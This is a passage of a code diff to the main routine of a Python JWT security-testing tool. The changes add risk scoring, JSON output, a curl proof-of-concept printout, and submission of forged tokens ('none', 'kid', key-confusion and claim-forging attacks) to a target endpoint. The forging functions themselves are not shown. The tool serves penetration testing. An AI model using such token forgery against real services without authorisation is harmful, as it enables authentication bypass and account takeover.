         print(f"{RED}{t('parse_error', error=e)}{RESET}")
         sys.exit(1)
-
+    
     print(f"{DRED}=================================================={RESET}")
     print(f"{RED}{BOLD}{t('token_type', type=info['type'])}{RESET}")
     print(f"{RED}{BOLD}{t('header')}{RESET}")
@@ -933,16 +1126,14 @@ def main():
     if info["type"] == "JWS":
         print(f"{RED}{BOLD}{t('payload')}{RESET}")
         print(json.dumps(info["payload"], indent=2))
-        
-        # --- NESTED PAYLOAD ANALYZER ---
         analyze_nested_payload(info["payload"])
-        # -------------------------------
     else:
         print(f"{DIM}{t('jwe_encrypted')}{RESET}")
-
+    
     if info["duplicates"]:
         print(f"{RED}{t('duplicate_keys', keys=info['duplicates'])}{RESET}")
-
+    
+    findings = []
     if args.analyze and info["type"] == "JWS":
         print(f"\n{DRED}=================================================={RESET}")
         print(f"{RED}{BOLD}{t('vuln_analysis')}{RESET}")
@@ -951,14 +1142,39 @@ def main():
             print(f"  {GREEN}{t('no_issues')}{RESET}")
         else:
             for sev, msg in findings:
-                if sev == "CRITICAL": color = f"{BOLD}{DRED}"
-                elif sev == "HIGH": color = RED
-                elif sev == "MEDIUM": color = YELLOW
-                elif sev == "LOW": color = GREEN
-                else: color = WHITE
-                
+                if sev == "CRITICAL":
+                    color = f"{BOLD}{DRED}"
+                elif sev == "HIGH":
+                    color = RED
+                elif sev == "MEDIUM":
+                    color = YELLOW
+                elif sev == "LOW":
+                    color = GREEN
+                else:
+                    color = WHITE
                 print(f"  {color}[{sev}]{RESET} {msg}")
-            sys.exit(5)
+        
+        # Risk score
+        if findings:
+            score_map = {"CRITICAL": 10, "HIGH": 5, "MEDIUM": 2, "LOW": 1, "INFO": 0}
+            total = sum(score_map.get(s, 0) for s, _ in findings)
+            if total >= 15:
+                level = "CRITICAL"
+            elif total >= 8:
+                level = "HIGH"
+            elif total >= 3:
+                level = "MEDIUM"
+            else:
+                level = "LOW"
+            print(f"\n{DRED}{t('risk_score', score=total, level=level)}{RESET}")
+        
+        if args.json:
+            out = {
+                "header": info["header"],
+                "payload": info["payload"],
+                "findings": [{"severity": s, "message": m} for s, m in findings]
+            }
+            print(json.dumps(out, indent=2))
     
     if args.crack:
         print(f"\n{DRED}=================================================={RESET}")
@@ -973,11 +1189,10 @@ def main():
         except Exception as e:
             print(f"{RED}{t('error', error=e)}{RESET}")
             sys.exit(1)
-
+    
     if args.attack and info["type"] == "JWS":
         print(f"\n{DRED}=================================================={RESET}")
         print(f"{RED}{BOLD}{t('attack_mode', mode=args.attack.upper())}{RESET}")
-        
         new_token = None
         try:
             if args.attack == "none":
@@ -985,19 +1200,39 @@ def main():
             elif args.attack == "kid":
                 new_token = forge_kid(info)
             elif args.attack == "confusion":
-                if not args.pubkey: raise JwtError(t("pubkey_required"))
-                with open(args.pubkey, "rb") as f: new_token = forge_confusion(info, f.read())
+                if not args.pubkey:
+                    raise JwtError(t("pubkey_required"))
+                with open(args.pubkey, "rb") as f:
+                    new_token = forge_confusion(info, f.read())
             elif args.attack == "forge":
-                if not args.secret: raise JwtError(t("secret_required"))
+                if not args.secret:
+                    raise JwtError(t("secret_required"))
                 new_token = forge_claims(info, args.set, args.secret.encode(), args.jku, args.x5u)
         except Exception as e:
             print(f"{RED}{t('attack_failed', error=e)}{RESET}")
             sys.exit(1)
-
+        
         if new_token:
             print(f"{GREEN}{t('forged_token')}{RESET}\n{new_token}")
-            if args.url:
-                test_http_endpoint(args.url, args.method, args.headers, new_token, original_token=token, insecure=args.insecure)
+            
+            if args.poc and args.url:
+                print(f"\n{YELLOW}{t('poc_generated')}{RESET}")
+                print(t("poc_curl", method=args.method, url=args.url, token=new_token))
+            
+            if args.verify_endpoint:
+                test_http_endpoint(
+                    args.verify_endpoint, args.method, args.headers,
+                    new_token, original_token=token, insecure=args.insecure,
+                    success_strings=args.success_strings,
+                    failure_strings=args.failure_strings
+                )
+            elif args.url:
+                test_http_endpoint(
+                    args.url, args.method, args.headers,
+                    new_token, original_token=token, insecure=args.insecure,
+                    success_strings=args.success_strings,
+                    failure_strings=args.failure_strings
+                )
     
     elif args.secret or args.pubkey:
         print(f"\n{DRED}=================================================={RESET}")
@@ -1006,27 +1241,33 @@ def main():
             if args.secret:
                 ok = verify_hmac(info, args.secret.encode())
                 print(f"{GREEN if ok else RED}{t('sig_valid') if ok else t('sig_invalid')}{RESET}")
-                if not ok: sys.exit(3)
+                if not ok:
+                    sys.exit(3)
             elif args.pubkey:
                 with open(args.pubkey, "rb") as f:
                     ok = verify_asymmetric(info, f.read())
                 print(f"{GREEN if ok else RED}{t('sig_valid') if ok else t('sig_invalid')}{RESET}")
-                if not ok: sys.exit(3)
+                if not ok:
+                    sys.exit(3)
         except Exception as e:
             print(f"{RED}{t('verification_error', error=e)}{RESET}")
             sys.exit(1)
-
-    # Footer
-    print(f"\n{DRED}=================================================={RESET}")
-    print(f"{RED}{BOLD}       READ MORE ON HACKITA{RESET}")
-    print(f"{DRED}=================================================={RESET}")
-    print(f" {WHITE}🇮🇹 Italian  : {RED}https://hackita.it/articoli/jwt/{RESET}")
-    print(f" {WHITE}🇬🇧 English  : {RED}https://en.hackita.it/articoli/jwt/{RESET}")
-    print(f" {WHITE}🇪🇸 Spanish  : {RED}https://es.hackita.it/articoli/jwt/{RESET}")
-    print(f" {WHITE}🇩🇪 German   : {RED}https://de.hackita.it/articoli/jwt/{RESET}")
-    print(f" {WHITE}🇵🇹 Portuguese: {RED}https://pt.hackita.it/articoli/jwt/{RESET}")
-    print(f" {WHITE}🇫🇷 French   : {RED}https://fr.hackita.it/articoli/jwt/{RESET}")
-    print(f"{DRED}=================================================={RESET}\n")
+    
+    # Footer (only if TTY)
+    if sys.stdout.isatty():
+        lang_urls = {
+            "it": "https://hackita.it/articoli/jwt/",
+            "en": "https://en.hackita.it/articoli/jwt/",
+            "es": "https://es.hackita.it/articoli/jwt/",
+            "pt": "https://pt.hackita.it/articoli/jwt/",
+            "de": "https://de.hackita.it/articoli/jwt/",
+            "fr": "https://fr.hackita.it/articoli/jwt/",
+        }
+        url = lang_urls.get(CURRENT_LANG, lang_urls["en"])
+        print(f"\n{DRED}=================================================={RESET}")
+        print(f"{RED}{BOLD}  Hackita  {WHITE}·  {DRED}JWT Security Testing Framework{RESET}")
+        print(f"{WHITE}  {url}{RESET}")
+        print(f"{DRED}=================================================={RESET}\n")
 
 if __name__ == "__main__":
     try:
